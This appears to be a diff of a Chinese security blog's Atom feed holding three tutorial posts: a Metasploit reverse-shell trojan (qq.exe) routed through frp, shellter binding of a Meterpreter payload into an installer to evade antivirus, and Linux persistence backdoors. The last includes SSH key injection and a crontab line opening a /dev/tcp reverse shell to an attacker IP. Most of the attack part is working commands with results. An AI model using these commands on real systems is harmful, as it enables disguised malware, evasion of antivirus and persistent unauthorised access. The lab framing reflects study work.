+&lt;li&gt;权限不够，记得加  &lt;code&gt;sudo&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;服务文件&lt;/strong&gt; 重要内容注释 如下图：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442841/Typera/2023/04/6e79855b87a38703bd5b740419dc6e65.png&#34; alt=&#34;image-20230426011356634&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;ssh-连接测试&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ssh-连接测试&#34;&gt;#&lt;/a&gt; SSH 连接测试&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;命令行  &lt;code&gt;ssh root@x.x.x.x -p 6666&lt;/code&gt; &lt;br /&gt;
+（&lt;strong&gt;root&lt;/strong&gt; 用户登录到 &lt;strong&gt;云服务器 x.x.x.x&lt;/strong&gt; 的 &lt;strong&gt;6666&lt;/strong&gt; 端口）&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442846/Typera/2023/04/52501488b9125c9518e2190783a8fcf4.png&#34; alt=&#34;&#34; /&gt;&lt;/li&gt;
+&lt;li&gt;Xshell 创建新会话，具体内容如下：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442854/Typera/2023/04/891e33c279efacbf48adee134034f971.png&#34; alt=&#34;image-20230426011410382&#34; /&gt;&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442861/Typera/2023/04/fe85e7d6d6e0e5955c77ff87a4ea5abe.png&#34; alt=&#34;image-20230426011417120&#34; /&gt;&lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;br /&gt;
+&lt;strong&gt;Xshell  连接成功&lt;/strong&gt;：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442869/Typera/2023/04/7eed7e40069de144ddcfb74725077325.png&#34; alt=&#34;image-20230426011424294&#34; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;msf-渗透攻击测试&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#msf-渗透攻击测试&#34;&gt;#&lt;/a&gt; msf 渗透攻击测试&lt;/h2&gt;
+&lt;p&gt;双击打开 刚刚建立的 &lt;strong&gt;Xshell 新会话&lt;/strong&gt;（ frp ）.&lt;/p&gt;
+&lt;h3 id=&#34;frpc-添加新配置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#frpc-添加新配置&#34;&gt;#&lt;/a&gt; frpc 添加新配置&lt;/h3&gt;
+&lt;p&gt;输入命令： &lt;code&gt;vim frpc.ini&lt;/code&gt; ，编辑 &lt;strong&gt;frpc&lt;/strong&gt; 配制文件，&lt;br /&gt;
+在文件末尾 &lt;strong&gt;添加&lt;/strong&gt;：&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[msf]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;type = tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;local_ip = 127.0.0.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;local_port = 4444&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;remote_port = 2333 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
+ 配置内容的 &lt;strong&gt;含义&lt;/strong&gt; 与 &lt;strong&gt;[ssh]&lt;/strong&gt; 类似，解释如图：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442874/Typera/2023/04/75402a4aa7e5b6970ffb51313c0a847f.png&#34; alt=&#34;image-20230426011431000&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;msf-生成木马&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#msf-生成木马&#34;&gt;#&lt;/a&gt; msf 生成木马&lt;/h3&gt;
+&lt;p&gt;与连接 &lt;strong&gt;本地的 shell&lt;/strong&gt; 生成木马不同，&lt;br /&gt;
+因为我们要使用 &lt;strong&gt;frp 穿透内网&lt;/strong&gt; 连接的 shell ，去 &lt;strong&gt;监听木马反弹&lt;/strong&gt;的 shell，&lt;br /&gt;
+所以我们 &lt;strong&gt;生成木马&lt;/strong&gt; 时，设置的 LHOST、LPORT 应当是 &lt;strong&gt;云服务器&lt;/strong&gt; 的对应数据。&lt;br /&gt;
+（直接用内网测试的时候，LHOST、LPORT 填的是 &lt;strong&gt;本地虚拟机&lt;/strong&gt; 的相关数据）&lt;/p&gt;
+&lt;p&gt;用 &lt;strong&gt;msf&lt;/strong&gt; 生成 &lt;strong&gt;windows&lt;/strong&gt; 系统的 &lt;strong&gt;反向 shell&lt;/strong&gt; 木马：&lt;br /&gt;
+ &lt;code&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=2333 -f exe &amp;gt; qq.exe&lt;/code&gt; &lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442881/Typera/2023/04/f72e4363a982738b25b5976722ab8948.png&#34; alt=&#34;image-20230426011437323&#34; /&gt;&lt;br /&gt;
+ 成功生成木马文件：&lt;strong&gt;qq.exe&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;msf-监听反弹的-shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#msf-监听反弹的-shell&#34;&gt;#&lt;/a&gt; msf 监听反弹的 shell&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;（确定 frps 、frpc 服务均已在后台运行）&lt;br /&gt;
+（事先上传 qq.exe 到测试的靶机，本文用 	Win7_x64 虚拟机替代）&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;关于&lt;strong&gt;上传&lt;/strong&gt;：Kali 虚拟机 开启 &lt;strong&gt;Apache2&lt;/strong&gt; 服务，Win7_x64 虚拟机 内网访问下载：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442886/Typera/2023/04/79c8bcdd330dc38041cee9fa333d9bb8.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;msfconsole&lt;/code&gt;
+&lt;ul&gt;
+&lt;li&gt;打开 &lt;strong&gt;msf&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;use exploit/multi/handler&lt;/code&gt;
+&lt;ul&gt;
+&lt;li&gt;选择使用的 exploit&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set PAYLOAD windows/x64/meterpreter/reverse_tcp&lt;/code&gt;
+&lt;ul&gt;
+&lt;li&gt;设置 PAYLOAD （生成木马时使用的）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set LHOST 127.0.0.1&lt;/code&gt;
+&lt;ul&gt;
+&lt;li&gt;设置 LHOST 为本地 IP&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set LPORT 4444&lt;/code&gt;
+&lt;ul&gt;
+&lt;li&gt;设置 LPORT 为转发的本地端口 4444&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;run
+&lt;ul&gt;
+&lt;li&gt;开始监听&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;blockquote&gt;
+&lt;p&gt;（先让 &lt;strong&gt;msf&lt;/strong&gt; 开始监听，再双击运行上传的木马文件）&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;演示如图所示：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;双击 &lt;strong&gt;运行木马&lt;/strong&gt;：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442892/Typera/2023/04/553d087d53826c0f6f0bc2edf848b2b0.png&#34; alt=&#34;image-20230426011447735&#34; /&gt;&lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/li&gt;
+&lt;li&gt;msf &lt;strong&gt;开始监听&lt;/strong&gt; &amp;amp; 成功获得 meterpreter &lt;strong&gt;shell&lt;/strong&gt;：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442902/Typera/2023/04/204ea56873200eb9b2507252955adb2a.png&#34; alt=&#34;image-20230426011457351&#34; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+        <category term="Linux" />
+        <category term="Kali" />
+        <category term="Trojan horse" />
+        <category term="Metasploit" />
+        <category term="frp" />
+        <updated>2022-04-18T12:18:36.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%85%8D%E6%9D%80%E6%8D%86%E7%BB%91%E5%B7%A5%E5%85%B7shellter%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/</id>
+        <title>免杀捆绑工具 shellter 的安装及使用</title>
+        <link rel="alternate" href="https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%85%8D%E6%9D%80%E6%8D%86%E7%BB%91%E5%B7%A5%E5%85%B7shellter%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/"/>
+        <content type="html">&lt;div class=&#34;note default&#34;&gt;
+&lt;p&gt;&lt;strong&gt;shellter&lt;/strong&gt; 是一个&lt;strong&gt;捆绑&lt;/strong&gt;工具，采用动态 &lt;strong&gt;shellcode&lt;/strong&gt; 注入 的方式，将 &lt;strong&gt;shellcode&lt;/strong&gt; 注入到其它程序中，达到&lt;strong&gt;免杀&lt;/strong&gt;的效果，躲避杀软的查杀。&lt;/p&gt;
+&lt;/div&gt;
+&lt;h2 id=&#34;shellter-安装&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#shellter-安装&#34;&gt;#&lt;/a&gt; shellter 安装&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;添加 &lt;strong&gt;i386 32 位&lt;/strong&gt; 架构支持、更新 &lt;strong&gt;apt&lt;/strong&gt;、安装 &lt;strong&gt;wine&lt;/strong&gt; 依赖：
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;dpkg --add-architecture i386 &amp;amp;&amp;amp; apt update &amp;amp;&amp;amp; apt -y install wine32&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;安装 &lt;strong&gt;shellter&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;apt install shellter&lt;/code&gt; &lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443125/Typera/2023/04/0c4297a033272d1212d9cb86e4daf005.png&#34; alt=&#34;image-20230426011840045&#34; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;shellter-使用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#shellter-使用&#34;&gt;#&lt;/a&gt; shellter 使用&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;使用 shellter 捆绑 Meterpreter_Reverse_TCP&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;捆绑步骤：&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;命令行输入  &lt;code&gt;shellter&lt;/code&gt;  打开工具&lt;/li&gt;
+&lt;li&gt;输入  &lt;code&gt;A&lt;/code&gt;  或者  &lt;code&gt;a&lt;/code&gt; ，选择 &lt;strong&gt;自动模式&lt;/strong&gt;；&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;PE Target:&lt;/code&gt;  后输入要进行 &lt;strong&gt;捆绑&lt;/strong&gt; 的 &lt;strong&gt;文件路径&lt;/strong&gt;&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443164/Typera/2023/04/272fa29e9da9d004a3cf25b87079f7de.png&#34; alt=&#34;image-20230426011919683&#34; /&gt;&lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/li&gt;
+&lt;li&gt;输入 &lt;code&gt;Y&lt;/code&gt; ，进入 &lt;strong&gt;隐形模式&lt;/strong&gt;&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443168/Typera/2023/04/0ac54c6f74fda57f2a51ac0b8bde409f.png&#34; alt=&#34;image-20230426011923428&#34; /&gt;&lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/li&gt;
+&lt;li&gt;输入 &lt;code&gt;L&lt;/code&gt; ，使用 &lt;strong&gt;payload&lt;/strong&gt; 攻击模块列表（即上面的 &lt;strong&gt;1~7&lt;/strong&gt; ）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;payload&lt;/strong&gt; 编号选择  &lt;code&gt;1&lt;/code&gt;  ，使用 Meterpreter_Reverse_TCP 攻击&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443172/Typera/2023/04/073c31195d0c78a68e8b3c2fecbc8531.png&#34; alt=&#34;image-20230426011927372&#34; /&gt;&lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/li&gt;
+&lt;li&gt;分别输入监听端的 &lt;strong&gt;IP&lt;/strong&gt;、&lt;strong&gt;端口号&lt;/strong&gt;&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443175/Typera/2023/04/396417290b20f351cc3c1d96669a3c4e.png&#34; alt=&#34;image-20230426011931101&#34; /&gt;&lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/li&gt;
+&lt;li&gt;按  &lt;code&gt;[Enter]&lt;/code&gt;  退出 &lt;strong&gt;shellter&lt;/strong&gt; ：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443179/Typera/2023/04/0169aba2f4b7dfa0ba83b3304994339f.png&#34; alt=&#34;image-20230426011934700&#34; /&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&amp;lt;br&amp;gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;[关于生成的文件]&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;捆绑完毕&lt;/strong&gt;的文件 会代替 &lt;strong&gt;原文件&lt;/strong&gt; ，即出现在 原文件目录 下，&lt;strong&gt;名字相同&lt;/strong&gt;&lt;br /&gt;
+而&lt;strong&gt;原文件&lt;/strong&gt;会 &lt;strong&gt;备份&lt;/strong&gt; 在目录  &lt;code&gt;/root/Shellter_Backups/&lt;/code&gt;  ：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443183/Typera/2023/04/9b58fed5ce217d4b84967579f2522d55.png&#34; alt=&#34;image-20230426011938517&#34; /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;利用-免杀效果&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用-免杀效果&#34;&gt;#&lt;/a&gt; 利用 &amp;amp; 免杀效果&lt;/h2&gt;
+&lt;h3 id=&#34;利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用&#34;&gt;#&lt;/a&gt; 利用&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;上传到 &lt;strong&gt;Win7_x64&lt;/strong&gt; 虚拟机，&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Kali_Linux&lt;/strong&gt; 虚拟机打开 &lt;strong&gt;msf&lt;/strong&gt; （命令  &lt;code&gt;msfconsole&lt;/code&gt; ），监听&lt;strong&gt;反弹 shell&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;use exploit/multi/handler&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set payload windows/meterpreter/reverse_tcp&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set LHOST 192.168.158.139&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set LPORT 4444&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;run&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;反弹 shell&lt;/strong&gt; 成功！&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443189/Typera/2023/04/4eff497abdd31d7be53e51e0d88f75f7.png&#34; alt=&#34;image-20230426011944783&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;免杀效果&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#免杀效果&#34;&gt;#&lt;/a&gt; 免杀效果&lt;/h3&gt;
+&lt;p&gt;我的 &lt;strong&gt;Win7_x64 虚拟机&lt;/strong&gt; 安装了 &lt;strong&gt;360 全家桶&lt;/strong&gt;，&lt;/p&gt;
+&lt;p&gt;但是 &lt;strong&gt;静态检测&lt;/strong&gt; 貌似并没有查出 &lt;strong&gt;木马文件&lt;/strong&gt;～&lt;/p&gt;
+&lt;p&gt;运行木马程序，并成功获得 &lt;strong&gt;meterpreter&lt;/strong&gt; 的 &lt;strong&gt;shell&lt;/strong&gt; 之后，&lt;strong&gt;360&lt;/strong&gt; 竟然也没有第一时间报毒。。。 什么情况 (⊙_⊙)？&lt;/p&gt;
+&lt;p&gt;大概一分钟之后，才提示有木马：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443194/Typera/2023/04/69719cbb27c9df97660f0c6405be89c7.png&#34; alt=&#34;image-20230426011949574&#34; /&gt;&lt;br /&gt;
+（实际上这个时间足够黑客 &lt;strong&gt;迁移进程&lt;/strong&gt; 并 &lt;strong&gt;布置后门&lt;/strong&gt; 了)&lt;/p&gt;
+&lt;p&gt;当然，如果你的电脑以前中过这个毒，&lt;strong&gt;360&lt;/strong&gt; 会第一时间反应过来&lt;br /&gt;
+（但这要是&lt;strong&gt;还没反应&lt;/strong&gt;，&lt;strong&gt;360&lt;/strong&gt; 就该进回收站了）&lt;/p&gt;
+&lt;p&gt;然后看看 &lt;strong&gt;virustotal&lt;/strong&gt; 的检测情况（&lt;strong&gt;31 / 70&lt;/strong&gt;）：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvZTRlOTdiZWY4NWYzOTcwZDQyZTgxZDZmNzU4MTUwNTBkN2ZmMjM3MDc5MDg4OGZlOWQ3ODk0OGJjODNiMzBhNw==&#34;&gt;检测报告 传送门 1&lt;/span&gt;&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443198/Typera/2023/04/6a65ae126f5f5f5c0658d6165d837a04.png&#34; alt=&#34;image-20230426011954090&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;对比 ：&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
+使用 同程序 同&lt;strong&gt; payload&lt;/strong&gt;，用 &lt;strong&gt;msf&lt;/strong&gt; 自带的捆绑手段生成的木马：&lt;br /&gt;
+（命令： &lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.158.139 LPORT=4444 -x npp.8.1.4.Installer.exe -f exe &amp;gt; mp_npp.exe&lt;/code&gt; ）&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;virustotal&lt;/strong&gt; 的检测情况（&lt;strong&gt;40 /  70&lt;/strong&gt;）：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvYzNhN2MyMjgwZTRhYTlhYTA2OTM3MjkwNDlmN2Y4ZTBmZjA1ZTI1M2MxMDQ3ZWYyODI3NDhjMzUwOTY4NzIwNw==&#34;&gt;检测报告 传送门 2&lt;/span&gt;&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443202/Typera/2023/04/c0631de31f6d8f365c052ec14a014b37.png&#34; alt=&#34;image-20230426011958597&#34; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;相比较而言，可以说 &lt;strong&gt;shellter&lt;/strong&gt; 的捆绑&lt;strong&gt;免杀&lt;/strong&gt;效果比 &lt;strong&gt;msf&lt;/strong&gt; 好很多了。&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+        <category term="Linux" />
+        <category term="Kali" />
+        <category term="Trojan horse" />
+        <category term="Metasploit" />
+        <category term="shellter" />
+        <updated>2022-04-16T10:10:24.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://www.sycamore.top/CyberSecurity/%E5%90%8E%E9%97%A8/linux-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B8%B8%E8%A7%81%E7%9A%84%E7%95%99%E5%90%8E%E9%97%A8%E6%96%B9%E5%BC%8F%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
+        <title>linux 服务器常见的留后门方式（二）</title>
+        <link rel="alternate" href="https://www.sycamore.top/CyberSecurity/%E5%90%8E%E9%97%A8/linux-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B8%B8%E8%A7%81%E7%9A%84%E7%95%99%E5%90%8E%E9%97%A8%E6%96%B9%E5%BC%8F%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
+        <content type="html">&lt;div class=&#34;note primary&#34;&gt;
+&lt;p&gt;整理好了搭环境的文章：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLnN5Y2Ftb3JlLnRvcC8yMDIyLzAzLzIxL0xJTlVYJUU1JTkwJThFJUU5JTk3JUE4JUU1JUE0JThEJUU3JThFJUIwJUU3JThFJUFGJUU1JUEyJTgzJUU2JTkwJUFEJUU1JUJCJUJBLw==&#34;&gt;LINUX 后门复现环境搭建&lt;/span&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;p&gt;攻击者在通过各种手段获得服务器的控制权之后，通常会在服务器上布置一些脚本、进程、链接，即所谓的&lt;strong&gt;后门&lt;/strong&gt;。其目的是，方便攻击者以后对该服务器进行持久性的攻击。&lt;/p&gt;
+&lt;p&gt;其中，在 linux 服务器上留后门的常见技术，&lt;strong&gt;本文中会提及&lt;/strong&gt;如下几种：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;SSH 公钥免密&lt;/li&gt;
+&lt;li&gt;crontab 后门&lt;br /&gt;
+...&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;ssh公钥免密&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ssh公钥免密&#34;&gt;#&lt;/a&gt; SSH 公钥免密&lt;/h2&gt;
+&lt;p&gt;简而言之，&lt;strong&gt;SSH 公钥免密&lt;/strong&gt;就是，将&lt;strong&gt;攻击者&lt;/strong&gt;生成的 &lt;strong&gt;ssh 公钥&lt;/strong&gt;写到&lt;strong&gt;目标服务器&lt;/strong&gt;的 &lt;code&gt;/root/.ssh/authorized_keys&lt;/code&gt;  中（手动在目标机上完成注册），&lt;br /&gt;
+然后&lt;strong&gt;攻击者&lt;/strong&gt;就可以利用对应的&lt;strong&gt;私钥&lt;/strong&gt;免密登录。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;实现：&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;使用 &lt;strong&gt;Xshell&lt;/strong&gt; 的 工具 -&amp;gt; 新建用户密钥生成向导，完成&lt;strong&gt; ssh 公钥、私钥&lt;/strong&gt;的生成：&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442537/Typera/2023/04/0c7400e842c42ccbcd324c9147cf6c24.png&#34; alt=&#34;image-20230426010853712&#34; /&gt;&lt;br /&gt;
+（填入密码)&lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;保存生成的公钥文件（id_rsa_2048.pub），传到&lt;strong&gt;目标服务器&lt;/strong&gt;上，&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442569/Typera/2023/04/8a2edc41bc3463490d0617bcbbd9acd1.png&#34; alt=&#34;image-20230426010925673&#34; /&gt;&lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;寻找 &lt;strong&gt;authorized_keys&lt;/strong&gt; 文件，命令 &lt;code&gt;find -name authorized_keys&lt;/code&gt; ，&lt;br /&gt;
+如果没有，就通过命令 &lt;code&gt;touch /root/.ssh/authorized_keys&lt;/code&gt;  创建。&lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;命令 &lt;code&gt;ssh-keygen -t rsa&lt;/code&gt;  开启免密登录功能，&lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;通过命令 &lt;code&gt;cat 公钥路径 &amp;gt;&amp;gt; /root/.ssh/authorized_keys&lt;/code&gt;  把公钥写入到&lt;strong&gt; authorized_keys&lt;/strong&gt;，完成注册&lt;br /&gt;
+ &amp;lt;br&amp;gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;修改文件权限 &lt;code&gt;chmod 600 ~/.ssh/authorized_keys&lt;/code&gt; &lt;br /&gt;
+ &lt;code&gt;chmod 700 ~/.ssh&lt;/code&gt; &lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;攻击者使用&lt;strong&gt; Xshell&lt;/strong&gt; 生成的&lt;strong&gt;私钥&lt;/strong&gt;和之前填写的&lt;strong&gt;密码&lt;/strong&gt;，登录目标服务器&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442599/Typera/2023/04/f0b36186750c7e6ae6e0cfb6e31536aa.png&#34; alt=&#34;image-20230426010955314&#34; /&gt;&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442619/Typera/2023/04/3707348bcf16ceccd18bb0594ff0933d.png&#34; alt=&#34;image-20230426011015095&#34; /&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;crontab后门&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#crontab后门&#34;&gt;#&lt;/a&gt; crontab 后门&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Crond&lt;/strong&gt; 服务启动后，会&lt;strong&gt;定期&lt;/strong&gt;（默认一分钟检查一次）检查它的配置文件中，是否有要执行的任务。&lt;br /&gt;
+如果有，就会根据&lt;strong&gt;预先设定&lt;/strong&gt;的&lt;strong&gt;定时任务规则&lt;/strong&gt;自动执行该任务。&lt;br /&gt;
+crontab 是用来定期执行程序的命令，&lt;br /&gt;
+我们可以通过&lt;strong&gt; crontab&lt;/strong&gt; 命令制造定时后门：&lt;br /&gt;
+ &lt;code&gt;(crontab -l;echo &#39;*/60 * * * * exec 9&amp;lt;&amp;gt; /dev/tcp/192.168.158.132/2333;exec 0&amp;lt;&amp;amp;9;exec 1&amp;gt;&amp;amp;9 2&amp;gt;&amp;amp;1;/bin/bash --noprofile -i&#39;)|crontab -&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;解释：&lt;/strong&gt;&lt;br /&gt;
+ &lt;code&gt;echo &#39;*/60 * * * *&#39;&lt;/code&gt; ：设定每 60 分钟执行一次；&lt;br /&gt;
+ &lt;code&gt;exec 9&amp;lt;&amp;gt;/dev/tcp/192.168.158.132/2333&lt;/code&gt; ：利用 bash 提供的功能，对 &lt;code&gt;/dev/tcp/&lt;/code&gt;  开头的字符串进行&lt;strong&gt;解析&lt;/strong&gt;，指定&lt;strong&gt;服务器 IP&lt;/strong&gt; 为：192.168.158.132（&lt;strong&gt;攻击机&lt;/strong&gt; IP），&lt;strong&gt;端口号&lt;/strong&gt;为 2333，指定描述符为 9，建立网络连接；&lt;br /&gt;
